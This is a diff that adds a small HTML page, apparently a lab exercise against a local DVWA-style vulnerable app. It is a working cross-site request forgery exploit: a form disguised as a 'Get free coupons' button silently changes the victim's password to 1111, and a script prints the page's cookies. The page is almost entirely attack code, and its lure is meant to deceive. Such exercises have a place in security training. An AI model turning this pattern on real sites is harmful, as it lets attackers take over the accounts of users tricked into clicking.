@@ -1,0 +1,36 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>csrf by POST</title>
+  <script src="https://unpkg.com/axios/dist/axios.min.js"></script>
+</head>
+<body>
+set password to: 1111
+
+<form action="http://localhost:8086/vulnerabilities/csrf/" method="get">
+  <input type="xhidden" name="password_new" value="1111"/>
+  <input type="xhidden" name="password_conf" value="1111"/>
+  <input type="hidden" name="Change" value="Change"/>
+  <input type="submit" value="Get free coupons 💸💸💸"/>
+</form>
+
+<script>
+  axios.interceptors.request.use((config) => {
+    console.log('axios:intercept request:')
+    return config
+  }, (error) => {
+    console.error(error)
+  })
+
+  axios.interceptors.response.use((config) => {
+    console.log('axios:intercept response:')
+    return config
+  }, (error) => {
+    console.error(error)
+  })
+
+  console.log(`your cookie is: ${document.cookie}`)
+</script>
+</body>
+</html>
